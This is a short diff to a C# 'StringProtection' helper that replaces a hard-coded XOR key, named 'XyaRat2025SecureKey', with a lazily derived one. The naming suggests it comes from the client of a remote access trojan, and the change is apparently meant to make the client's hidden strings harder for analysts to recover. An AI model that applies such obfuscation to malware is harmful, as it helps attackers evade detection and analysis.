@@ -5,7 +5,22 @@ namespace Client.Helper
 {
     public static class StringProtection
     {
-        private static readonly byte[] XorKey = Encoding.UTF8.GetBytes("XyaRat2025SecureKey");
+        private static byte[] _xorKey = null;
+        
+        /// <summary>
+        /// Gets the XOR key (lazy initialization with secure derivation)
+        /// </summary>
+        private static byte[] XorKey
+        {
+            get
+            {
+                if (_xorKey == null)
+                {
+                    _xorKey = SecureKeyDerivation.GetStringProtectionKey();
+                }
+                return _xorKey;
+            }
+        }
 
         public static string Decrypt(string encrypted)
         {
